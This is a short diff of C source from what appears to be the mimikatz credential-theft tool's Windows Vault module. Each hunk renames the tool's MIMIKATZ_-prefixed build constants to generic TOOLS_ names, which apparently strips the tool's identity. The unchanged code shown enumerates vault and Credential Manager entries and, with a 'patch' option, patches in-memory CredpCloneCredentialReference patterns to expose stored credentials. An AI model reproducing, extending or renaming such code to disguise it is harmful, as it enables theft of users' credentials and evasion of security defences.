@@ -93,7 +93,7 @@ NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
 						kprintf(L"\tItems (%u)\n", cbItems);
 						for(j = 0; j < cbItems; j++)
 						{
-							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
+							if(TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
 							{
 								items7 = (PVAULT_ITEM_7) items;
 								kprintf(L"\t %2u.\t%s\n", j, items7[j].FriendlyName);
@@ -358,7 +358,7 @@ void kuhl_m_vault_list_descVault(HANDLE hVault)
 		VaultFree(information.string);
 	}
 	RtlZeroMemory(&information, sizeof(VAULT_INFORMATION));
-	information.type = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? VaultInformation_Path_7 : VaultInformation_Path_8;
+	information.type = (TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? VaultInformation_Path_7 : VaultInformation_Path_8;
 	if(NT_SUCCESS(VaultGetInformation(hVault, 0, &information)))
 	{
 		kprintf(L"\tPath       : %s\n", information.string ? information.string : L"temp vault");
@@ -459,7 +459,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 	static BOOL isPatching = FALSE;	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), TOOLS_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = CredpCloneCredentialReference->Search.Pattern;
 			aPatchMemory.address = CredpCloneCredentialReference->Patch.Pattern;
@@ -526,7 +526,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 				CredFree(pCredential);
 			}
 			flags++;
-		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
+		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (TOOLS_NT_MAJOR_VERSION > 5));
 	}
 	return STATUS_SUCCESS;
 }
